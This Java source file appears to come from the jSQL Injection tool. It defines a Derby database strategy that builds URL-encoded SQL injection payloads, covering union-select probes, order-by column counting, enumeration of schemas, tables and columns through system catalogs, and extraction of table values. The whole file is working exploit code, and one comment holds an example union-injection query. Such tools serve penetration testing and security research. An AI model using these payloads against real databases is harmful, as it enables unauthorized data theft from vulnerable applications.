package com.jsql.model.vendor;

import java.util.ArrayList;
import java.util.List;

import com.jsql.model.bean.Database;
import com.jsql.model.bean.Table;
import com.jsql.model.injection.MediatorModel;
import com.jsql.tool.ToolsString;

public class DerbyStrategy extends ASQLStrategy {

    @Override
    public String getSchemaInfos() {
        return
            "SELECT+'-'||'{%}'||CURRENT+SCHEMA"
            + "||'{%}'||CURRENT_USER||'{%}'||SESSION_USER||'%01%03%03%07'from+SYSIBM.SYSDUMMY1";
    }

    @Override
    public String getSchemaList() {
        return
            /**
             * aggreg function return exec fault
             * SELECT item_type FROM SALES where 1=0 union select list(rdb$relation_name,'a')from(select rdb$relation_name from rdb$relations ROWS 2 TO 2)-- 0x0000000100000000
             * => use limit 1,1 instead
             */
            "select+'%04'||schemaname||'%050%04%01%03%03%07'FROM+SYS.SYSSCHEMAS{limit}";
    }

    @Override
    public String getTableList(Database database) {
        return
            "select'%04'||trim(tablename)||'%050%04%01%03%03%07'from+sys.systables+t+inner+join+sys.sysschemas+s+on+t.schemaid=s.schemaid+where+schemaname='" + database + "'{limit}";
    }

    @Override
    public String getColumnList(Table table) {
        return
            "select'%04'||trim(columnname)||'%050%04%01%03%03%07'from+sys.systables+t+"
            + "inner+join+sys.sysschemas+s+on+t.schemaid=s.schemaid+"
            + "inner+join+sys.syscolumns+c+on+t.tableid=c.referenceid+"
            + "where+schemaname='" + table.getParent() + "'"
            + "and+tablename='" + table + "'"
            /**
             * TODO impossible de caster un numeric to string dans getValues()
             * => masquage des colonnes numériques
             */
            + "and+columndatatype||''not+like'DOUBLE%'"
            + "and+columndatatype||''not+like'INTEGER%'"
            + "and+columndatatype||''not+like'DECIMAL%'"
            + "and+columndatatype||''not+like'BLOB%'"
            + "{limit}"
            ;
    }

    @Override
    public String getValues(String[] columns, Database database, Table table) {
        String formatListColumn = ToolsString.join(columns, ",''))||'%7f'||trim(coalesce(");
        formatListColumn = "trim(coalesce(" + formatListColumn + ",''))";
        
        return
            "SELECT'%04'||" + formatListColumn + "||'%050%04%01%03%03%07'from+" + database + "." + table + "{limit}";
    }

    @Override
    public String normalStrategy(String sqlQuery, String startPosition) {
        return
            "select+" +
                /**
                 * If reach end of string (SQLii) then NULLIF nullifies the result
                 */
                 "'SQLi'||NULLIF(substr(" +
                 "(" + sqlQuery + ")," +
                 startPosition + "" +
             "),'%01%03%03%07')from+SYSIBM.SYSDUMMY1";
     }

     @Override
     public String getIndicesCapacity(String[] indexes) {
         return
             MediatorModel.model().initialQuery.replaceAll(
                 "1337(" + ToolsString.join(indexes, "|") + ")7331",
                 "(select+'SQLi$1'||'%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23'||'iLQS'from+SYSIBM.SYSDUMMY1)"
             );
     }

    @Override
    public String getIndices(Integer nbFields) {
        List<String> fields = new ArrayList<String>(); 
        for (int i = 1 ; i <= nbFields ; i++) {
            fields.add("trim(cast((1337"+ i +"7330%2b1)as+char(254)))");
        }
        return "+union+select+" + ToolsString.join(fields.toArray(new String[fields.size()]), ",") + "+from+SYSIBM.SYSDUMMY1--+";
    }

    @Override
    public String getOrderBy() {
        return "+order+by+1337--+";
    }

    @Override
    public String getLimit(Integer limitSQLResult) {
        return "+OFFSET+" + limitSQLResult + "+ROWS+FETCH+NEXT+1+ROWS+ONLY";
    }
    
    @Override
    public String getDbLabel() {
        return "Derby";
    }
}